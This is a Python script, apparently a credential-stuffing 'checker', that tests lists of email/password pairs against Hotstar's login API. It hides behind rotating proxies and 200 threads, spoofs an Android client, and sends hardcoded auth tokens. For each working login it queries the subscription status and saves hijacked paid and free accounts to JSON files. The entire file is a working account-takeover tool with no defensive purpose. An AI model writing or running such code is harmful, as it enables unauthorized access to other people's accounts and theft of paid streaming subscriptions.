import json
from threading import Thread, Lock

from httplib2 import ProxyInfo, Http

from emailpassword import email_password
from proxydictionary2 import htttp_proxy, socks4_proxy, socks5_proxy

start_count = 0
ip_count = 0
proxy_list = []
combos = []
verified = []
lock = Lock()


def select_proxy():
    global ip_count
    with lock:
        if ip_count == len(proxy_list):
            print(ip_count)
            ip_count = 0
        ip = ip_count
        ip_count += 1
    return ip

def inc_count(proxy_num):
    proxy_list[proxy_num]["count"] += 1


class CreateTask(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        while True:
            proxy_num = select_proxy()
            proxy = proxy_list[proxy_num]
            try:
                temp = 0
                global start_count
                if start_count >= len(combos):
                    break
                with lock:
                    k = start_count
                    start_count += 1
                    print(start_count)
                combo = combos[k]
                http = Http(
                    proxy_info=ProxyInfo(proxy_host=str(proxy["proxy"]), proxy_port=int(proxy["port"]),
                                         proxy_type=proxy["type"], proxy_user=proxy["user"], proxy_pass=proxy["pass"]))
                headers = {
                    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M)",
                    "Content-Type": "application/json",
                    "Origin": "https://www.hotstar.com",
                    "Referer": "https://www.hotstar.com/in",
                    "hotstarauth": "st=1556707390~exp=1556707990~acl=/*~hmac=ad817d9e5b9c219b7cdb086e891e8633187c3723f6aa1212fda9b4140e60036f"
                }
                body = json.dumps({
                    "isProfileRequired": True,
                    "userData": {
                        "deviceId": "c3f61ee7-16e7-415a-aeae-43dfea1eda87",
                        "pId": "a25865a67413447098a8d1ee7388982e",
                        "password": combo["password"],
                        "username": combo["email"],
                        "usertype": "email"
                    },
                    "verification": {}
                })
                res, cont = http.request("https://api.hotstar.com/in/aadhar/v2/android/in/users/login", method="POST",
                                         body=body, headers=headers)
                if cont:

                    cont = json.loads(cont.decode(encoding="UTF-8"))
                    headers["userId"] = cont["description"]["userIdentity"]
                    headers["hotstarauth"] = "st=1556707980~exp=1556708580~acl=/in/gringotts*~hmac=d7abcbad27cdf9427c10cdc51da81551dbd949a82898539c97a894c933b30b24"

                    res, cont = http.request("https://api.hotstar.com/in/gringotts/v2/android/in/subscription?verbose=1",
                                             method="GET", headers=headers)
                    cont = json.loads(cont.decode(encoding="UTF-8"))
                    print(cont["active_subs"][0]["commercial_pack"])
                    if "active_subs" in cont.keys():
                        print(combo, "Expires On: ", cont["active_subs"][0]["commercial_pack"])
                        combo["expireOn"] = cont["active_subs"][0]["commercial_pack"]
                        verified.append(combo)
                        # with lock:
                        with open("hotstar"+str(k) + ".json", "w") as a:
                            json.dump(combo, a)
                    else:
                        print(combo, "     Free")
                        combo["expireOn"] = "Free"
                        verified.append(combo)
                        with open("Free-" + str(k) + ".json", "w") as a:
                            json.dump(combo, a)
                    del http
            except Exception as a:
                # print(a)
                inc_count(proxy_num)
                continue
            if temp == 1:
                break


# proxy_list = proxy_list + socks5_proxy() + socks4_proxy() +
proxy_list = htttp_proxy()
combos = email_password()
# print(proxy_list[0])
# print(combos[0])

for i in range(0, 200):
    thread = CreateTask()
    thread.start()
